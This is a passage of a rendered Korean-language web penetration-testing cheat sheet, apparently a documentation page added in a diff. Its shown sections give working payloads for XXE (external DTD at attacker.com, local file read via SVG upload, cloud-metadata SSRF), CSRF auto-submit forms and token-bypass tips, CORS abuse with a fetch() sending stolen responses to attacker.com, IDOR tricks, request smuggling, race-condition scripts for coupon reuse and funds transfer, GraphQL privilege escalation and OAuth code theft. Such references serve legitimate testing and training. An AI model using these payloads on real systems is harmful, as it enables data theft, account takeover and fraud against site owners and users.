+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>%exfil;
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
+<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="cm">&lt;!-- 대상에 전송 --&gt;</span>
+<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="cp">  &lt;!ENTITY % xxe SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;</span>
+<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="w">  </span>%xxe;
+<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>]&gt;
+<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a><span class="nt">&lt;root&gt;</span>test<span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<h3 id="xxe-via-file-upload">XXE via File Upload</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cm">&lt;!-- SVG 파일 --&gt;</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><span class="w"> </span>]&gt;
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;128px&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;128px&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">font-size=</span><span class="s">&quot;16&quot;</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;16&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="nt">&lt;/svg&gt;</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="cm">&lt;!-- XLSX, DOCX (ZIP 내부 XML 편집) --&gt;</span>
+</code></pre></div>
+<h3 id="xxe-ssrf">XXE → SSRF</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>]&gt;
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<hr />
+<h2 id="csrf-cross-site-request-forgery">CSRF (Cross-Site Request Forgery)</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="cm">&lt;!-- GET 기반 CSRF --&gt;</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://target.com/admin/deleteUser?id=1&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="cm">&lt;!-- POST 기반 CSRF (자동 제출) --&gt;</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://target.com/account/changeEmail&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;attacker@evil.com&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;csrf&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>
+<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="cm">&lt;!-- JSON body CSRF --&gt;</span>
+<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://target.com/api/update&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;email&quot;:&quot;attacker@evil.com&quot;,&quot;ignore&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;&quot;}&#39;</span><span class="p">&gt;</span>
+<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">CSRF 토큰 우회</p>
+<ul>
+<li>토큰 값 제거 (파라미터 자체를 삭제)</li>
+<li>다른 사용자의 토큰 재사용</li>
+<li>HTTP method 변경 (POST → GET)</li>
+<li>Content-Type 변경으로 preflight 우회</li>
+</ul>
+</div>
+<hr />
+<h2 id="cors-misconfiguration">CORS Misconfiguration</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Origin 반사 확인</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>-I<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Origin: https://evil.com&quot;</span><span class="w"> </span>https://target.com/api/data<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;access-control&#39;</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c1"># null Origin 허용 확인</span>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>curl<span class="w"> </span>-s<span class="w"> </span>-I<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Origin: null&quot;</span><span class="w"> </span>https://target.com/api/data<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;access-control&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="cm">&lt;!-- 취약한 CORS 설정 악용 (credentials 포함) --&gt;</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="kd">var</span><span class="w"> </span><span class="nx">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="nx">req</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span><span class="w"> </span>
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/log?data=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">btoa</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">));</span><span class="w"> </span>
+<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="p">};</span>
+<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;https://target.com/api/sensitive&#39;</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>주요 취약 설정:</p>
+<table>
+<thead>
+<tr>
+<th>설정</th>
+<th>위험도</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Access-Control-Allow-Origin: *</code> + credentials</td>
+<td>높음</td>
+</tr>
+<tr>
+<td>Origin 반사 (요청 Origin 그대로 응답)</td>
+<td>높음</td>
+</tr>
+<tr>
+<td><code>null</code> Origin 허용</td>
+<td>중간</td>
+</tr>
+<tr>
+<td>서브도메인 와일드카드 (<code>*.target.com</code>)</td>
+<td>중간</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="idor-access-control">IDOR / Access Control</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1"># 수평적 권한 상승 (다른 사용자 데이터 접근)</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>GET<span class="w"> </span>/api/users/1001<span class="w"> </span>→<span class="w"> </span>GET<span class="w"> </span>/api/users/1002
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="c1"># 수직적 권한 상승 (관리자 기능 접근)</span>
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>GET<span class="w"> </span>/admin/dashboard<span class="w">  </span><span class="c1"># 일반 사용자 세션으로</span>
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>POST<span class="w"> </span>/api/users/1001/role<span class="w">  </span><span class="c1"># 권한 변경</span>
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="c1"># UUID/GUID 예측 불가해 보여도 leak 가능</span>
+<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="c1"># 다른 API 응답, 에러 메시지, HTML 소스에서 ID 유출 확인</span>
+<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>
+<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a><span class="c1"># API 버전 변경으로 인증 우회</span>
+<a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>/api/v2/users/1001<span class="w"> </span>→<span class="w"> </span>/api/v1/users/1001
+<a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>
+<a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a><span class="c1"># HTTP method 변경</span>
+<a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>GET<span class="w"> </span>/api/users/1001<span class="w"> </span>→<span class="w"> </span>PUT<span class="w"> </span>/api/users/1001<span class="w"> </span><span class="o">(</span>body에<span class="w"> </span>수정<span class="w"> </span>데이터<span class="o">)</span>
+<a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>
+<a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a><span class="c1"># 파라미터 오염</span>
+<a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a>GET<span class="w"> </span>/api/users?id<span class="o">=</span><span class="m">1001</span><span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span><span class="m">1002</span>
+</code></pre></div>
+<hr />
+<h2 id="http-request-smuggling">HTTP Request Smuggling</h2>
+<p><code>Content-Length</code>와 <code>Transfer-Encoding</code> 헤더 해석 차이를 악용.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="err"># CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target.com</span>
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">13</span>
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>0
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>SMUGGLED
+<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>
+<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a># TE.CL (Front-end: Transfer-Encoding, Back-end: Content-Length)
+<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>POST / HTTP/1.1
+<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>Host: target.com
+<a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>Content-Length: 3
+<a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a>Transfer-Encoding: chunked
+<a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a>
+<a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a>8
+<a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a>SMUGGLED
+<a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a>0
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># 탐지 도구</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="c1"># smuggler.py</span>
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>python3<span class="w"> </span>smuggler.py<span class="w"> </span>-u<span class="w"> </span>https://target.com
+<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>
+<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="c1"># Burp Suite → HTTP Request Smuggler 확장</span>
+</code></pre></div>
+<hr />
+<h2 id="race-condition">Race Condition</h2>
+<p>동시 요청을 통해 비즈니스 로직을 우회하는 공격.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Burp Suite Turbo Intruder (single-packet attack)</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="c1"># 또는 curl 병렬 요청</span>
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1"># 할인 코드 중복 적용</span>
+<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">20</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://target.com/api/apply-coupon<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="w">    </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=TOKEN&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="w">    </span>-d<span class="w"> </span><span class="s2">&quot;code=DISCOUNT50&quot;</span><span class="w"> </span><span class="p">&amp;</span>
+<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="k">done</span>
+<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="nb">wait</span>
+<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>
+<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="c1"># 잔액 초과 인출 (TOCTOU)</span>
+<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="c1"># 동시에 여러 출금 요청 전송</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># Python + threading</span>
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">threading</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
+<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
+<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">race</span><span class="p">():</span>
+<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://target.com/api/transfer&quot;</span><span class="p">,</span>
+<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;session&quot;</span><span class="p">:</span> <span class="s2">&quot;TOKEN&quot;</span><span class="p">},</span>
+<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;amount&quot;</span><span class="p">:</span> <span class="s2">&quot;1000&quot;</span><span class="p">,</span> <span class="s2">&quot;to&quot;</span><span class="p">:</span> <span class="s2">&quot;attacker&quot;</span><span class="p">})</span>
+<a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>
+<a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="n">threads</span> <span class="o">=</span> <span class="p">[</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">race</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">)]</span>
+<a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</code></pre></div>
+<hr />
+<h2 id="graphql">GraphQL 공격</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># Introspection Query (스키마 전체 노출)</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="o">{</span><span class="s2">&quot;query&quot;</span>:<span class="s2">&quot;{ __schema { queryType { name } types { name fields { name type { name } } } } }&quot;</span><span class="o">}</span>
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
+<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c1"># 특정 타입 필드 확인</span>
+<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="o">{</span><span class="s2">&quot;query&quot;</span>:<span class="s2">&quot;{ __type(name:\&quot;User\&quot;) { fields { name type { name } } } }&quot;</span><span class="o">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># 인증 우회 / 권한 상승 시도</span>
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="o">{</span><span class="s2">&quot;query&quot;</span>:<span class="s2">&quot;{ users { id username email password } }&quot;</span><span class="o">}</span>
+<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
+<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="c1"># Mutation을 통한 데이터 변조</span>
+<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="o">{</span><span class="s2">&quot;query&quot;</span>:<span class="s2">&quot;mutation { updateUser(id:1, role:\&quot;admin\&quot;) { id role } }&quot;</span><span class="o">}</span>
+<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>
+<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="c1"># Batch Query (Rate Limit 우회)</span>
+<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="o">[{</span><span class="s2">&quot;query&quot;</span>:<span class="s2">&quot;{ user(id:1) { email } }&quot;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&quot;query&quot;</span>:<span class="s2">&quot;{ user(id:2) { email } }&quot;</span><span class="o">}</span>,...<span class="o">]</span>
+<a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>
+<a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="c1"># 도구: InQL (Burp 확장), graphql-voyager, clairvoyance (Introspection 비활성화 시)</span>
+</code></pre></div>
+<hr />
+<h2 id="oauth">OAuth 공격</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># 1. Open Redirect → Authorization Code 탈취</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="c1"># redirect_uri 파라미터에 공격자 서버 지정</span>
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>https://auth.target.com/authorize?client_id<span class="o">=</span>ID<span class="p">&amp;</span><span class="nv">redirect_uri</span><span class="o">=</span>https://attacker.com/callback<span class="p">&amp;</span><span class="nv">response_type</span><span class="o">=</span>code
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>
+<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="c1"># 2. CSRF (state 파라미터 미검증)</span>
+<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="c1"># state 없이 authorization flow 시작 → 공격자의 계정 연결</span>
+<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>
+<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="c1"># 3. 토큰 유출 (Implicit Flow)</span>
+<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="c1"># response_type=token → Fragment(#)에 토큰 → Referer로 유출 가능</span>
+<a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>
+<a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="c1"># 4. PKCE 미적용 시 Authorization Code Interception</span>
+<a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a><span class="c1"># 모바일 앱에서 code_verifier 없이 code만으로 토큰 교환</span>
+</code></pre></div>
+<hr />
+<h2 id="_9">유용한 도구</h2>
+<table>
+<thead>
+<tr>
+<th>도구</th>
+<th>용도</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Burp Suite</td>
+<td>웹 프록시, 스캐너</td>
+</tr>
+<tr>
+<td>ffuf</td>
+<td>웹 퍼저</td>
+</tr>
+<tr>
+<td>sqlmap</td>
+<td>SQL Injection 자동화</td>
+</tr>
+<tr>
+<td>nikto</td>
+<td>웹 취약점 스캐너</td>
+</tr>
+<tr>
+<td>wfuzz</td>
+<td>웹 퍼저</td>
+</tr>
+<tr>
+<td>jwt_tool</td>
+<td>JWT 공격</td>
+</tr>
+<tr>
+<td>ysoserial</td>
+<td>Java Deserialization</td>
+</tr>
+<tr>
+<td>nuclei</td>
+<td>템플릿 기반 취약점 스캐너</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
